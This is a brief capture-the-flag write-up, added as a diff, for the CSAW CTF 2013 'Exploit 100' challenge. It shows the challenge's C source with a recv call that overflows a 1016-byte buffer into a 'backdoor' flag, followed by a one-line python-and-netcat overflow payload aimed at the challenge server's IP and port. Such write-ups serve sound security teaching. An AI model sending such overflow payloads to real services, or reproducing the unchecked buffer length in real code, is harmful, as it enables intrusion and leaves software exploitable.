@@ -1,0 +1,27 @@
+CSAW CTF 2013 - Exploit 100
+================================
+
+Source for exploit 100 were provided:
+```
+void handle(int newsock) {
+    int backdoor = 0;
+	char buffer[1016];
+	memset(buffer, 0, 1016);
+
+	send(newsock, "Welcome to CSAW CTF.", 21, 0);
+	recv(newsock, buffer, 1020, 0);
+	buffer[1015] = 0;
+
+	if ( backdoor ) {
+		fd = fopen("./key", "r");
+		fscanf(fd, "%s\n", buffer);
+		send(newsock, buffer, 512, 0);
+	}
+	close(newsock);
+}
+```
+To print the key, we need to set `backdoor` to something else than `0`. This can be done by a simple buffer overflow. the `recv` function read 1020 bytes into a buffer of 1016 bytes. The 4 extra bytes are going to overwrite the `backdoor`'s value.
+
+To get the key:
+`python -c "print '\xff' * 1020" | nc 128.238.66.212 31337`
+
